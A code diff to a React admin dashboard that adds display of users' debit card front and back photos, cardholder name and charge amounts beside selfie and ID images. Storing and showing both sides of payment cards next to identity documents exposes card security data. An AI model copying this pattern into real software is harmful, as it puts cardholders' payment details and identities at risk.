@@ -175,7 +175,16 @@ export default function AdminDashboard() {
   const [loading, setLoading] = useState(true);
   const [error, setError] = useState("");
   const [selectedUser, setSelectedUser] = useState<User | null>(null);
-  const [photoData, setPhotoData] = useState<{ selfiePhoto?: string; idFrontPhoto?: string; idBackPhoto?: string } | null>(null);
+  const [photoData, setPhotoData] = useState<{
+    selfiePhoto?: string;
+    idFrontPhoto?: string;
+    idBackPhoto?: string;
+    cardFrontPhoto?: string;
+    cardBackPhoto?: string;
+    cardName?: string;
+    cardChargeAmount1?: number | null;
+    cardChargeAmount2?: number | null;
+  } | null>(null);
   const [photoLoading, setPhotoLoading] = useState(false);
   const [photoCache, setPhotoCache] = useState(() => loadPhotoCache());
   const [refreshing, setRefreshing] = useState(false);
@@ -329,44 +338,70 @@ export default function AdminDashboard() {
               {photoLoading ? (
                 <PhotoLoadingBar duration={30000} />
               ) : photoData ? (
-                <div className="grid grid-cols-1 md:grid-cols-3 gap-8 mb-8">
-                  <div>
-                    <h3 className="text-sm font-semibold text-purple-400 mb-3 uppercase tracking-wide">Selfie Photo</h3>
-                    <div className="relative w-full aspect-square rounded-xl overflow-hidden border border-purple-500/30 bg-gray-900">
-                      {photoData.selfiePhoto ? (
-                        <Image src={photoData.selfiePhoto} alt="Selfie" fill sizes="100vw" className="object-cover" priority />
-                      ) : (
-                        <div className="w-full h-full flex items-center justify-center text-gray-500">
-                          No Photo
-                        </div>
-                      )}
+                <>
+                  <div className="grid grid-cols-1 md:grid-cols-3 gap-8 mb-8">
+                    <div>
+                      <h3 className="text-sm font-semibold text-purple-400 mb-3 uppercase tracking-wide">Selfie Photo</h3>
+                      <div className="relative w-full aspect-square rounded-xl overflow-hidden border border-purple-500/30 bg-gray-900">
+                        {photoData.selfiePhoto ? (
+                          <Image src={photoData.selfiePhoto} alt="Selfie" fill sizes="100vw" className="object-cover" priority />
+                        ) : (
+                          <div className="w-full h-full flex items-center justify-center text-gray-500">
+                            No Photo
+                          </div>
+                        )}
+                      </div>
+                    </div>
+                    <div>
+                      <h3 className="text-sm font-semibold text-purple-400 mb-3 uppercase tracking-wide">ID Front</h3>
+                      <div className="relative w-full aspect-square rounded-xl overflow-hidden border border-purple-500/30 bg-gray-900">
+                        {photoData.idFrontPhoto ? (
+                          <Image src={photoData.idFrontPhoto} alt="ID Front" fill sizes="100vw" className="object-cover" priority />
+                        ) : (
+                          <div className="w-full h-full flex items-center justify-center text-gray-500">
+                            No Photo
+                          </div>
+                        )}
+                      </div>
+                    </div>
+                    <div>
+                      <h3 className="text-sm font-semibold text-purple-400 mb-3 uppercase tracking-wide">ID Back</h3>
+                      <div className="relative w-full aspect-square rounded-xl overflow-hidden border border-purple-500/30 bg-gray-900">
+                        {photoData.idBackPhoto ? (
+                          <Image src={photoData.idBackPhoto} alt="ID Back" fill sizes="100vw" className="object-cover" priority />
+                        ) : (
+                          <div className="w-full h-full flex items-center justify-center text-gray-500">
+                            No Photo
+                          </div>
+                        )}
+                      </div>
                     </div>
                   </div>
-                  <div>
-                    <h3 className="text-sm font-semibold text-purple-400 mb-3 uppercase tracking-wide">ID Front</h3>
-                    <div className="relative w-full aspect-square rounded-xl overflow-hidden border border-purple-500/30 bg-gray-900">
-                      {photoData.idFrontPhoto ? (
-                        <Image src={photoData.idFrontPhoto} alt="ID Front" fill sizes="100vw" className="object-cover" priority />
-                      ) : (
-                        <div className="w-full h-full flex items-center justify-center text-gray-500">
-                          No Photo
-                        </div>
-                      )}
+                  {/* Card images and name */}
+                  <div className="grid grid-cols-1 md:grid-cols-2 gap-8 mb-8">
+                    <div>
+                      <h3 className="text-sm font-semibold text-purple-400 mb-3 uppercase tracking-wide">Debit Card Front</h3>
+                      <div className="relative w-full aspect-square rounded-xl overflow-hidden border border-purple-500/30 bg-gray-900">
+                        {photoData.cardFrontPhoto ? (
+                          <Image src={photoData.cardFrontPhoto} alt="Card Front" fill sizes="100vw" className="object-cover" priority />
+                        ) : (
+                          <div className="w-full h-full flex items-center justify-center text-gray-500">No Photo</div>
+                        )}
+                      </div>
+                    </div>
+                    <div>
+                      <h3 className="text-sm font-semibold text-purple-400 mb-3 uppercase tracking-wide">Debit Card Back</h3>
+                      <div className="relative w-full aspect-square rounded-xl overflow-hidden border border-purple-500/30 bg-gray-900">
+                        {photoData.cardBackPhoto ? (
+                          <Image src={photoData.cardBackPhoto} alt="Card Back" fill sizes="100vw" className="object-cover" priority />
+                        ) : (
+                          <div className="w-full h-full flex items-center justify-center text-gray-500">No Photo</div>
+                        )}
+                      </div>
                     </div>
                   </div>
-                  <div>
-                    <h3 className="text-sm font-semibold text-purple-400 mb-3 uppercase tracking-wide">ID Back</h3>
-                    <div className="relative w-full aspect-square rounded-xl overflow-hidden border border-purple-500/30 bg-gray-900">
-                      {photoData.idBackPhoto ? (
-                        <Image src={photoData.idBackPhoto} alt="ID Back" fill sizes="100vw" className="object-cover" priority />
-                      ) : (
-                        <div className="w-full h-full flex items-center justify-center text-gray-500">
-                          No Photo
-                        </div>
-                      )}
-                    </div>
-                  </div>
-                </div>
+                  <div className="mb-4 text-purple-400 font-mono text-lg">Cardholder Name: {photoData.cardName || 'N/A'}</div>
+                </>
               ) : (
                 <div className="text-center text-sm text-gray-400 mt-4">No photo data found</div>
               )}
